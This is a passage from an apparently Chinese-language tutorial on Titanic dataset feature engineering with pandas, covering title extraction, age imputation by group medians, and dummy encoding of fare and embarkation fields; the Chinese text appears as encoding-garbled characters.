get_combined_data()</span><br></pre></td></tr></table></figure><p>è®©æˆ‘ä»¬çœ‹ä¸€ä¸‹æ•°æ®çš„ç»´åº¦ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> combined.shape</span><br></pre></td></tr></table></figure><pre><code>(1309, 10)</code></pre><p>è®­ç»ƒé›†å’Œæµ‹è¯•é›†è¢«åˆå¹¶ã€‚æ‚¨å¯èƒ½ä¼šæ³¨æ„åˆ°æ€»è¡Œæ•°ï¼ˆ1309ï¼‰æ˜¯è®­ç»ƒé›†å’Œæµ‹è¯•é›†ä¸­è¡Œæ•°çš„ç²¾ç¡®æ€»å’Œã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Pclass</th>      <th>Name</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Cabin</th>      <th>Embarked</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>3</td>      <td>Braund, Mr. Owen Harris</td>      <td>male</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>A/5 21171</td>      <td>7.2500</td>      <td>NaN</td>      <td>S</td>    </tr>    <tr>      <th>1</th>      <td>1</td>      <td>Cumings, Mrs. John Bradley (Florence Briggs Th...</td>      <td>female</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>PC 17599</td>      <td>71.2833</td>      <td>C85</td>      <td>C</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>Heikkinen, Miss. Laina</td>      <td>female</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>STON/O2. 3101282</td>      <td>7.9250</td>      <td>NaN</td>      <td>S</td>    </tr>    <tr>      <th>3</th>      <td>1</td>      <td>Futrelle, Mrs. Jacques Heath (Lily May Peel)</td>      <td>female</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>113803</td>      <td>53.1000</td>      <td>C123</td>      <td>S</td>    </tr>    <tr>      <th>4</th>      <td>3</td>      <td>Allen, Mr. William Henry</td>      <td>male</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>373450</td>      <td>8.0500</td>      <td>NaN</td>      <td>S</td>    </tr>  </tbody></table><h3><span id="ti-qu-cheng-ke-cheng-wei">æå–ä¹˜å®¢ç§°è°“</span></h3><p>åœ¨æŸ¥çœ‹ä¹˜å®¢å§“åæ—¶ï¼Œäººä»¬å¯èƒ½æƒ³çŸ¥é“å¦‚ä½•å¤„ç†å®ƒä»¬ä»¥æå–æœ‰ç”¨çš„ä¿¡æ¯ã€‚</p><p>å¦‚æœä½ ä»”ç»†çœ‹çœ‹è¿™äº›ç¬¬ä¸€ä¸ªä¾‹å­ï¼š</p><ul><li>Braund, <strong>Mr.</strong> Owen Harris</li><li>Heikkinen, <strong>Miss.</strong> Laina</li><li>Oliva y Ocana, <strong>Dona.</strong> Fermina</li><li>Peter, <strong>Master.</strong> Michael J</li></ul><p>ä½ ä¼šæ³¨æ„åˆ°æ¯ä¸ªåå­—éƒ½æœ‰ä¸€ä¸ªç§°è°“ï¼è¿™å¯èƒ½æ˜¯ä¸€ä¸ªç®€å•çš„å°å§ï¼ˆMiss.ï¼‰æˆ–å¤ªå¤ªï¼ˆMrs.ï¼‰ï¼Œä½†å®ƒæœ‰æ—¶å¯èƒ½åƒ Masterï¼ŒSir æˆ– Dona é‚£æ ·æ›´å¤æ‚ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç®€å•åœ°è§£æç§°è°“å¹¶æå–æ ‡é¢˜å¹¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶å˜é‡æ¥å¼•å…¥æœ‰å…³ç¤¾ä¼šåœ°ä½çš„å…¶ä»–ä¿¡æ¯ã€‚</p><p>è®©æˆ‘ä»¬çœ‹çœ‹æˆ‘ä»¬å°†å¦‚ä½•åœ¨ä¸‹é¢çš„å‡½æ•°ä¸­æ‰§è¡Œæ­¤æ“ä½œã€‚</p><p>è®©æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹åœ¨è®­ç»ƒé›†ä¸­æœ‰ä»€ä¹ˆä¸åŒçš„ç§°è°“ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">titles = <span class="built_in">set</span>()</span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> data[<span class="string">&#x27;Name&#x27;</span>]:</span><br><span class="line">    titles.add(name.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>].strip())</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> titles</span><br></pre></td></tr></table></figure><pre><code>set(['Sir', 'Major', 'the Countess', 'Don', 'Mlle', 'Capt', 'Dr', 'Lady', 'Rev', 'Mrs', 'Jonkheer', 'Master', 'Ms', 'Mr', 'Mme', 'Miss', 'Col'])</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Title_Dictionary = &#123;</span><br><span class="line">    <span class="string">&quot;Capt&quot;</span>: <span class="string">&quot;Officer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Col&quot;</span>: <span class="string">&quot;Officer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Major&quot;</span>: <span class="string">&quot;Officer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Jonkheer&quot;</span>: <span class="string">&quot;Royalty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Don&quot;</span>: <span class="string">&quot;Royalty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Sir&quot;</span> : <span class="string">&quot;Royalty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Dr&quot;</span>: <span class="string">&quot;Officer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Rev&quot;</span>: <span class="string">&quot;Officer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;the Countess&quot;</span>:<span class="string">&quot;Royalty&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mme&quot;</span>: <span class="string">&quot;Mrs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mlle&quot;</span>: <span class="string">&quot;Miss&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Ms&quot;</span>: <span class="string">&quot;Mrs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mr&quot;</span> : <span class="string">&quot;Mr&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Mrs&quot;</span> : <span class="string">&quot;Mrs&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Miss&quot;</span> : <span class="string">&quot;Miss&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Master&quot;</span> : <span class="string">&quot;Master&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Lady&quot;</span> : <span class="string">&quot;Royalty&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_titles</span>():</span><br><span class="line">    <span class="comment"># we extract the title from each name</span></span><br><span class="line">    combined[<span class="string">&#x27;Title&#x27;</span>] = combined[<span class="string">&#x27;Name&#x27;</span>].<span class="built_in">map</span>(<span class="keyword">lambda</span> name:name.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>].split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>].strip())</span><br><span class="line"></span><br><span class="line">    <span class="comment"># a map of more aggregated title</span></span><br><span class="line">    <span class="comment"># we map each title</span></span><br><span class="line">    combined[<span class="string">&#x27;Title&#x27;</span>] = combined.Title.<span class="built_in">map</span>(Title_Dictionary)</span><br><span class="line">    status(<span class="string">&#x27;Title&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>æ­¤å‡½æ•°è§£æåç§°å¹¶æå–ç§°è°“ã€‚ ç„¶åï¼Œå®ƒå°†ç§°è°“æ˜ å°„åˆ°ç§°è°“ç±»åˆ«ã€‚æˆ‘ä»¬é€‰æ‹©ï¼š</p><ul><li>Officer</li><li>Royalty</li><li>Mr</li><li>Mrs</li><li>Miss</li><li>Master</li></ul><p>è®©æˆ‘ä»¬è¿è¡Œä¸€ä¸‹ï¼</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = get_titles()</span><br></pre></td></tr></table></figure><pre><code>Processing Title : ok</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Pclass</th>      <th>Name</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Cabin</th>      <th>Embarked</th>      <th>Title</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>3</td>      <td>Braund, Mr. Owen Harris</td>      <td>male</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>A/5 21171</td>      <td>7.2500</td>      <td>NaN</td>      <td>S</td>      <td>Mr</td>    </tr>    <tr>      <th>1</th>      <td>1</td>      <td>Cumings, Mrs. John Bradley (Florence Briggs Th...</td>      <td>female</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>PC 17599</td>      <td>71.2833</td>      <td>C85</td>      <td>C</td>      <td>Mrs</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>Heikkinen, Miss. Laina</td>      <td>female</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>STON/O2. 3101282</td>      <td>7.9250</td>      <td>NaN</td>      <td>S</td>      <td>Miss</td>    </tr>    <tr>      <th>3</th>      <td>1</td>      <td>Futrelle, Mrs. Jacques Heath (Lily May Peel)</td>      <td>female</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>113803</td>      <td>53.1000</td>      <td>C123</td>      <td>S</td>      <td>Mrs</td>    </tr>    <tr>      <th>4</th>      <td>3</td>      <td>Allen, Mr. William Henry</td>      <td>male</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>373450</td>      <td>8.0500</td>      <td>NaN</td>      <td>S</td>      <td>Mr</td>    </tr>  </tbody></table><p>è®©æˆ‘ä»¬æ£€æŸ¥ä¸€ä¸‹ç§°è°“æ˜¯å¦å¡«å†™æ­£ç¡®ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined[combined[<span class="string">&#x27;Title&#x27;</span>].isnull()]</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Pclass</th>      <th>Name</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Cabin</th>      <th>Embarked</th>      <th>Title</th>    </tr>  </thead>  <tbody>    <tr>      <th>1305</th>      <td>1</td>      <td>Oliva y Ocana, Dona. Fermina</td>      <td>female</td>      <td>39.0</td>      <td>0</td>      <td>0</td>      <td>PC 17758</td>      <td>108.9</td>      <td>C105</td>      <td>C</td>      <td>NaN</td>    </tr>  </tbody></table><p>åœ¨1305è¡Œä¸­ç¡®å®å­˜åœ¨ NaN å€¼ã€‚å®é™…ä¸Šç›¸åº”çš„åç§°æ˜¯ <code>Oliva y Ocana, **Dona**. Fermina</code>ã€‚</p><p>åœ¨è®­ç»ƒæ•°æ®é›†ä¸­æ²¡æœ‰é‡åˆ°è¿™ä¸ªæ ‡é¢˜ã€‚</p><p>å¾ˆå¥½ï¼Œç°åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ªåä¸º <strong>Title</strong> çš„é™„åŠ åˆ—æ¥åŒ…å«è¿™äº›ä¿¡æ¯ã€‚</p><h3><span id="chu-li-nian-ling-age">å¤„ç†å¹´é¾„ï¼ˆAgeï¼‰</span></h3><p>æˆ‘ä»¬åœ¨ç¬¬ä¸€éƒ¨åˆ†ä¸­çœ‹åˆ° <code>Age</code> å˜é‡ç¼ºå°‘177ä¸ªå€¼ã€‚è¿™æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ•°å­—ï¼ˆçº¦å æ•°æ®é›†çš„13ï¼…ï¼‰ã€‚ç®€å•åœ°ç”¨å¹³å‡å¹´é¾„æˆ–ä¸­ä½å¹´é¾„æ›¿æ¢å®ƒä»¬å¯èƒ½ä¸æ˜¯æœ€ä½³è§£å†³æ–¹æ¡ˆï¼Œå› ä¸ºå¹´é¾„å¯èƒ½å› ä¹˜å®¢çš„ç±»åˆ«å’Œç±»åˆ«è€Œä¸åŒã€‚</p><p>ä¸ºäº†ç†è§£åŸå› ï¼Œè®©æˆ‘ä»¬æŒ‰æ€§åˆ«ï¼ˆSexï¼‰ï¼Œç§°è°“ï¼ˆTitleï¼‰å’Œä¹˜å®¢ç±»ï¼ˆPclassï¼‰å¯¹æˆ‘ä»¬çš„æ•°æ®é›†è¿›è¡Œåˆ†ç»„ï¼Œå¹¶ä¸ºæ¯ä¸ªå­é›†è®¡ç®—ä¸­ä½æ•°å¹´é¾„ã€‚</p><p>ä¸ºäº†é¿å…æµ‹è¯•é›†ä¸­çš„æ•°æ®æ³„æ¼ï¼Œæˆ‘ä»¬ä½¿ç”¨è®­ç»ƒé›†å¡«å†™è®­ç»ƒä¸­çš„ç¼ºå¤±å¹´é¾„ï¼Œå¹¶ä¸”æˆ‘ä»¬ä½¿ç”¨ä»è®­ç»ƒé›†è®¡ç®—çš„å€¼æ¥å¡«å……æµ‹è¯•é›†ä¸­çš„å¹´é¾„ã€‚</p><p>è®­ç»ƒçº§ä¸­ç¼ºå°‘çš„å¹´é¾„æ•°</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> combined.iloc[:<span class="number">891</span>].Age.isnull().<span class="built_in">sum</span>()</span><br></pre></td></tr></table></figure><pre><code>177</code></pre><p>æµ‹è¯•é›†ä¸­ç¼ºå°‘çš„å¹´é¾„æ•°</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span> combined.iloc[<span class="number">891</span>:].Age.isnull().<span class="built_in">sum</span>()</span><br></pre></td></tr></table></figure><pre><code>86</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">grouped_train = combined.iloc[:<span class="number">891</span>].groupby([<span class="string">&#x27;Sex&#x27;</span>,<span class="string">&#x27;Pclass&#x27;</span>,<span class="string">&#x27;Title&#x27;</span>])</span><br><span class="line">grouped_median_train = grouped_train.median()</span><br><span class="line">grouped_median_train = grouped_median_train.reset_index()[[<span class="string">&#x27;Sex&#x27;</span>, <span class="string">&#x27;Pclass&#x27;</span>, <span class="string">&#x27;Title&#x27;</span>, <span class="string">&#x27;Age&#x27;</span>]]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">grouped_median_train.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Sex</th>      <th>Pclass</th>      <th>Title</th>      <th>Age</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>female</td>      <td>1</td>      <td>Miss</td>      <td>30.0</td>    </tr>    <tr>      <th>1</th>      <td>female</td>      <td>1</td>      <td>Mrs</td>      <td>40.0</td>    </tr>    <tr>      <th>2</th>      <td>female</td>      <td>1</td>      <td>Officer</td>      <td>49.0</td>    </tr>    <tr>      <th>3</th>      <td>female</td>      <td>1</td>      <td>Royalty</td>      <td>40.5</td>    </tr>    <tr>      <th>4</th>      <td>female</td>      <td>2</td>      <td>Miss</td>      <td>24.0</td>    </tr>  </tbody></table><p>æ­¤ dataframe å°†å¸®åŠ©æˆ‘ä»¬æ ¹æ®ä¸åŒçš„æ ‡å‡†ä¼°ç®—ç¼ºå¤±çš„å¹´é¾„å€¼ã€‚</p><p>æŸ¥çœ‹ä¸­ä½å¹´é¾„åˆ—ï¼Œçœ‹çœ‹è¿™ä¸ªå€¼å¦‚ä½•æ ¹æ® <code>Sex</code>ï¼Œ<code>Pclass</code> å’Œ <code>Title</code> ç»„åˆåœ¨ä¸€èµ·ã€‚</p><p>ä¾‹å¦‚ï¼š</p><ul><li>å¦‚æœä¹˜å®¢æ˜¯å¥³æ€§ï¼Œåˆ™æ¥è‡ª Pclass 1 å’Œæ¥è‡ªç‹å®¤ï¼ˆroyaltyï¼‰ï¼Œä¸­ä½å¹´é¾„ä¸º40.5å²ã€‚</li><li>å¦‚æœä¹˜å®¢æ˜¯ç”·æ€§ï¼Œæ¥è‡ª Pclass 3ï¼Œæ‹¥æœ‰ Mr ç§°è°“ï¼Œåˆ™å¹´é¾„ä¸­ä½æ•°ä¸º26å²ã€‚</li></ul><p>è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œæ ¹æ®è¿™äº›ä¸åŒçš„å±æ€§å¡«å…… <strong>ç»„åˆ</strong> ä¸­çš„ç¼ºå¤±å¹´é¾„ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fill_age</span>(<span class="params">row</span>):</span><br><span class="line">    condition = (</span><br><span class="line">        (grouped_median_train[<span class="string">&#x27;Sex&#x27;</span>] == row[<span class="string">&#x27;Sex&#x27;</span>]) &amp; </span><br><span class="line">        (grouped_median_train[<span class="string">&#x27;Title&#x27;</span>] == row[<span class="string">&#x27;Title&#x27;</span>]) &amp; </span><br><span class="line">        (grouped_median_train[<span class="string">&#x27;Pclass&#x27;</span>] == row[<span class="string">&#x27;Pclass&#x27;</span>])</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> grouped_median_train[condition][<span class="string">&#x27;Age&#x27;</span>].values[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_age</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># a function that fills the missing values of the Age variable</span></span><br><span class="line">    combined[<span class="string">&#x27;Age&#x27;</span>] = combined.apply(<span class="keyword">lambda</span> row: fill_age(row) <span class="keyword">if</span> np.isnan(row[<span class="string">&#x27;Age&#x27;</span>]) <span class="keyword">else</span> row[<span class="string">&#x27;Age&#x27;</span>], axis=<span class="number">1</span>)</span><br><span class="line">    status(<span class="string">&#x27;age&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_age()</span><br></pre></td></tr></table></figure><pre><code>Processing age : ok</code></pre><p>å®Œç¾ã€‚å¤±è¸ªçš„å¹´é¾„å·²è¢«å–ä»£ã€‚</p><p>ä½†æ˜¯ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ç¥¨ä»·ï¼ˆFareï¼‰ä¸­ç¼ºå°‘1ä¸ªå€¼ï¼Œç™»èˆ¹ä½ç½®ï¼ˆEmbarkedï¼‰æœ‰ä¸¤ä¸ªç¼ºå¤±å€¼ï¼Œè€Œèˆ¹èˆ±ä½ç½®ï¼ˆCabinï¼‰æœ‰å¾ˆå¤šç¼ºå¤±å€¼ã€‚æˆ‘ä»¬ç¨åä¼šå¤„ç†è¿™äº›å˜é‡ã€‚</p><p>æˆ‘ä»¬ç°åœ¨å¤„ç†åå­—ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_names</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># we clean the Name variable</span></span><br><span class="line">    combined.drop(<span class="string">&#x27;Name&#x27;</span>, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># encoding in dummy variable</span></span><br><span class="line">    titles_dummies = pd.get_dummies(combined[<span class="string">&#x27;Title&#x27;</span>], prefix=<span class="string">&#x27;Title&#x27;</span>)</span><br><span class="line">    combined = pd.concat([combined, titles_dummies], axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># removing the title variable</span></span><br><span class="line">    combined.drop(<span class="string">&#x27;Title&#x27;</span>, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    status(<span class="string">&#x27;names&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>æ­¤å‡½æ•°ä¼šåˆ é™¤ <code>Name</code> åˆ—ï¼Œæˆ‘ä»¬ä¸å†ä½¿ç”¨å®ƒï¼Œå› ä¸ºæˆ‘ä»¬åˆ›å»ºäº† <code>Title</code> åˆ—ã€‚</p><p>ç„¶åæˆ‘ä»¬ä½¿ç”¨è™šæ‹Ÿç¼–ç ï¼ˆdummy encodingï¼‰å¯¹ç§°è°“å€¼è¿›è¡Œç¼–ç ã€‚</p><p>æ‚¨å¯ä»¥äº†è§£è™šæ‹Ÿç¼–ç ä»¥åŠå¦‚ä½•åœ¨ <a href="http://pandas.pydata.org/pandas-docs/stable/generated/pandas.get_dummies.html">Pandas</a> ä¸­è½»æ¾å®Œæˆæ­¤æ“ä½œã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_names()</span><br></pre></td></tr></table></figure><pre><code>Processing names : ok</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Pclass</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Cabin</th>      <th>Embarked</th>      <th>Title_Master</th>      <th>Title_Miss</th>      <th>Title_Mr</th>      <th>Title_Mrs</th>      <th>Title_Officer</th>      <th>Title_Royalty</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>3</td>      <td>male</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>A/5 21171</td>      <td>7.2500</td>      <td>NaN</td>      <td>S</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>1</th>      <td>1</td>      <td>female</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>PC 17599</td>      <td>71.2833</td>      <td>C85</td>      <td>C</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>female</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>STON/O2. 3101282</td>      <td>7.9250</td>      <td>NaN</td>      <td>S</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>3</th>      <td>1</td>      <td>female</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>113803</td>      <td>53.1000</td>      <td>C123</td>      <td>S</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>4</th>      <td>3</td>      <td>male</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>373450</td>      <td>8.0500</td>      <td>NaN</td>      <td>S</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>    </tr>  </tbody></table><p>å¦‚ä½ çœ‹åˆ°çš„ ï¼š</p><ul><li>ä¸å†æœ‰åå­—ç‰¹å¾ã€‚</li><li>å‡ºç°äº†æ–°çš„å˜é‡ï¼ˆTitle_Xï¼‰ã€‚è¿™äº›ç‰¹å¾æ˜¯äºŒè¿›åˆ¶çš„ã€‚<ul><li>ä¾‹å¦‚ï¼Œå¦‚æœ Title_Mr = 1ï¼Œåˆ™ç›¸åº”çš„ç§°è°“ä¸º Mrã€‚</li></ul></li></ul><h3><span id="chu-li-piao-jie-fare">å¤„ç†ç¥¨ä»·ï¼ˆFareï¼‰</span></h3><p>è®©æˆ‘ä»¬é€šè¿‡åœ¨è®­ç»ƒé›†ä¸Šè®¡ç®—çš„å¹³å‡ç¥¨ä»·ä¼°ç®—ç¼ºå¤±çš„ç¥¨ä»·å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_fares</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># there&#x27;s one missing fare value - replacing it with the mean.</span></span><br><span class="line">    combined.Fare.fillna(combined.iloc[:<span class="number">891</span>].Fare.mean(), inplace=<span class="literal">True</span>)</span><br><span class="line">    status(<span class="string">&#x27;fare&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>æ­¤å‡½æ•°ç”¨å¹³å‡å€¼æ›¿æ¢ä¸€ä¸ªç¼ºå¤±çš„ç¥¨ä»·ï¼ˆFareï¼‰å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_fares()</span><br></pre></td></tr></table></figure><pre><code>Processing fare : ok</code></pre><h3><span id="chu-li-deng-chuan-wei-zhi-embarked">å¤„ç†ç™»èˆ¹ä½ç½®ï¼ˆEmbarkedï¼‰</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_embarked</span>():</span><br><span class="line">    <span class="keyword">global</span> combined</span><br><span class="line">    <span class="comment"># two missing embarked values - filling them with the most frequent one in the train  set(S)</span></span><br><span class="line">    combined.Embarked.fillna(<span class="string">&#x27;S&#x27;</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">    <span class="comment"># dummy encoding</span></span><br><span class="line">    embarked_dummies = pd.get_dummies(combined[<span class="string">&#x27;Embarked&#x27;</span>], prefix=<span class="string">&#x27;Embarked&#x27;</span>)</span><br><span class="line">    combined = pd.concat([combined, embarked_dummies], axis=<span class="number">1</span>)</span><br><span class="line">    combined.drop(<span class="string">&#x27;Embarked&#x27;</span>, axis=<span class="number">1</span>, inplace=<span class="literal">True</span>)</span><br><span class="line">    status(<span class="string">&#x27;embarked&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> combined</span><br></pre></td></tr></table></figure><p>æ­¤å‡½æ•°ç”¨æœ€å¸¸ç”¨çš„ <code>Embarked</code> å€¼æ›¿æ¢äº†ä¸¤ä¸ªç¼ºå¤±çš„ <code>Embarked</code> å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined = process_embarked()</span><br></pre></td></tr></table></figure><pre><code>Processing embarked : ok</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">combined.head()</span><br></pre></td></tr></table></figure><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>Pclass</th>      <th>Sex</th>      <th>Age</th>      <th>SibSp</th>      <th>Parch</th>      <th>Ticket</th>      <th>Fare</th>      <th>Cabin</th>      <th>Title_Master</th>      <th>Title_Miss</th>      <th>Title_Mr</th>      <th>Title_Mrs</th>      <th>Title_Officer</th>      <th>Title_Royalty</th>      <th>Embarked_C</th>      <th>Embarked_Q</th>      <th>Embarked_S</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>3</td>      <td>male</td>      <td>22.0</td>      <td>1</td>      <td>0</td>      <td>A/5 21171</td>      <td>7.2500</td>      <td>NaN</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>    <tr>      <th>1</th>      <td>1</td>      <td>female</td>      <td>38.0</td>      <td>1</td>      <td>0</td>      <td>PC 17599</td>      <td>71.2833</td>      <td>C85</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>    </tr>    <tr>      <th>2</th>      <td>3</td>      <td>female</td>      <td>26.0</td>      <td>0</td>      <td>0</td>      <td>STON/O2. 3101282</td>      <td>7.9250</td>      <td>NaN</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>    <tr>      <th>3</th>      <td>1</td>      <td>female</td>      <td>35.0</td>      <td>1</td>      <td>0</td>      <td>113803</td>      <td>53.1000</td>      <td>C123</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>    <tr>      <th>4</th>      <td>3</td>      <td>male</td>      <td>35.0</td>      <td>0</td>      <td>0</td>      <td>373450</td>      <td>8.0500</td>      <td>NaN</td>      <td>0</td>      <td>0</td>      <td>1</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>0</td>      <td>1</td>    </tr>  </tbody></table><h3><span id="chu-li-chuan-cang-wei-zhi-cabin">å¤„ç†èˆ¹èˆ±ä½ç½®ï¼ˆCabinï¼‰</span></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">train_cabin, test_cabin = <span class="built_in">set</span>(), <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> combined.iloc[:<span class="number">891</span>][<span class="string">&#x27;Cabin&#x27;</span>]:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        train_cabin.add(c[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        train_cabin.add(<span class="string">&#x27;U&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c 